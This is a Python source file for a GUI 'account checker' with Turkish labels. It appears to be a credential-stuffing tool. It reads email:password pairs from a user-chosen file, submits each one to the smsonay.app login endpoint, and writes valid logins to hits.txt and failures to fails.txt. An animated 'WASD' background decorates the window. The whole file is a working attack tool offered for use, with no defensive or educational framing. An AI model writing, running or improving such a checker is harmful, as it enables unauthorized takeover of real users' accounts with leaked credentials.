import requests
import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import random
import math
import os

# === DOSYA AYARLARI ===
HITS_FILE = "hits.txt"
FAILS_FILE = "fails.txt"

class SMSOnayChecker:
    def __init__(self):
        self.accounts = []
        self.running = False
        self.hits = 0
        self.fails = 0

    def load_file(self):
        # DOSYA SEÇME PENCERESİ
        file_path = filedialog.askopenfilename(
            title="Hesap Listesini Seç (USER:PASS)", 
            filetypes=[("Text files", "*.txt")]
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    self.accounts = [line.strip() for line in f if ":" in line]
                status_label.config(text=f"{len(self.accounts)} hesap yüklendi.", fg="#00ff00")
                messagebox.showinfo("Başarılı", f"{len(self.accounts)} hesap yüklendi!")
            except Exception as e:
                messagebox.showerror("Hata", f"Dosya hatası: {e}")

    def check_logic(self, email, password):
        url = "https://smsonay.app/panel/ajax/login"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*"
        }
        payload = {"email": email, "password": password}
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if '{"success":true,"' in response.text: return "SUCCESS"
            elif 'success":false' in response.text or 'Ba\\u015far\\u0131s\\u0131z' in response.text: return "FAILURE"
            return "ERROR"
        except: return "RETRY"

    def worker(self, log_func):
        for acc in self.accounts:
            if not self.running: break
            try:
                user, pwd = acc.split(":", 1)
                res = self.check_logic(user, pwd)
                if res == "SUCCESS":
                    self.hits += 1
                    with open(HITS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                    log_func(f"[HIT] {user}", "#00ff00")
                else:
                    self.fails += 1
                    with open(FAILS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
                    log_func(f"[FAIL] {user}", "#ff3333")
                
                stats_label.config(text=f"HITS: {self.hits} | FAILS: {self.fails} | KALAN: {len(self.accounts)-(self.hits+self.fails)}")
            except: continue
        self.running = False

# === UI TASARIM ===
def start_app():
    checker = SMSOnayChecker()
    root = tk.Tk()
    root.title("SMSOnay Checker - WASD POWER")
    root.geometry("900x650")
    root.configure(bg="#050505")

    # --- CANVAS (ARKAPLAN WASD) ---
    canvas = tk.Canvas(root, bg="#050505", highlightthickness=0)
    canvas.place(x=0, y=0, relwidth=1, relheight=1)

    particles = []
    for _ in range(250):
        size = random.randint(10, 25)
        p = canvas.create_text(random.randint(0, 900), random.randint(0, 650),
                               text="WASD", font=("Arial", size, "bold"),
                               fill=random.choice(["#111", "#1a1a1a", "#222"]))
        particles.append([p, random.uniform(-0.8, 0.8), random.uniform(-1.2, -0.4)])

    def animate():
        mx, my = root.winfo_pointerx() - root.winfo_rootx(), root.winfo_pointery() - root.winfo_rooty()
        for p in particles:
            canvas.move(p[0], p[1], p[2])
            pos = canvas.coords(p[0])
            if pos:
                dist = math.sqrt((pos[0]-mx)**2 + (pos[1]-my)**2)
                if dist < 130: canvas.move(p[0], (pos[0]-mx)/8, (pos[1]-my)/8)
                if pos[1] < -50: canvas.coords(p[0], random.randint(0, 900), 680)
        canvas.tag_lower("all")
        root.after(25, animate)

    # --- ANA PANEL (SABİT KONUMLANDIRMA) ---
    main_frame = tk.Frame(root, bg="#0e0e0e", bd=1)
    main_frame.place(x=100, y=50, width=700, height=550)

    tk.Label(main_frame, text="SMSONAY ACCOUNT CHECKER v4", fg="#6366f1", bg="#0e0e0e", font=("Arial", 18, "bold")).place(x=180, y=20)
    
    global status_label, stats_label
    status_label = tk.Label(main_frame, text="Liste Bekleniyor...", fg="#555", bg="#0e0e0e", font=("Arial", 10))
    status_label.place(x=280, y=60)

    stats_label = tk.Label(main_frame, text="HITS: 0 | FAILS: 0 | KALAN: 0", fg="white", bg="#0e0e0e", font=("Arial", 12, "bold"))
    stats_label.place(x=220, y=90)

    # Console Alanı
    console = tk.Text(main_frame, bg="#050505", fg="#888", font=("Consolas", 10), relief="flat")
    console.place(x=30, y=130, width=640, height=300)
    console.config(state="disabled")

    def log_to_console(text, color):
        console.config(state="normal")
        console.insert("end", text + "\n", color)
        console.tag_config(color, foreground=color)
        console.see("end")
        console.config(state="disabled")

    def start_thread():
        if not checker.accounts:
            messagebox.showwarning("Hata", "Dayı önce listeyi yükle!")
            return
        checker.running = True
        threading.Thread(target=checker.worker, args=(log_to_console,), daemon=True).start()

    # --- BUTONLAR (TAMAMEN SABİT) ---
    # LİSTE YÜKLE BUTONU
    btn_load = tk.Button(main_frame, text="LİSTE YÜKLE (.txt)", bg="#2a2a2a", fg="white", relief="flat", 
                         font=("Arial", 10, "bold"), command=checker.load_file, cursor="hand2")
    btn_load.place(x=30, y=450, width=200, height=50)

    # BAŞLAT BUTONU
    btn_start = tk.Button(main_frame, text="BAŞLAT", bg="#6366f1", fg="white", relief="flat", 
                          font=("Arial", 10, "bold"), command=start_thread, cursor="hand2")
    btn_start.place(x=250, y=450, width=200, height=50)

    # DURDUR BUTONU
    btn_stop = tk.Button(main_frame, text="DURDUR", bg="#ef4444", fg="white", relief="flat", 
                         font=("Arial", 10, "bold"), command=lambda: setattr(checker, 'running', False), cursor="hand2")
    btn_stop.place(x=470, y=450, width=200, height=50)

    animate()
    root.mainloop()

if __name__ == "__main__":
    start_app()
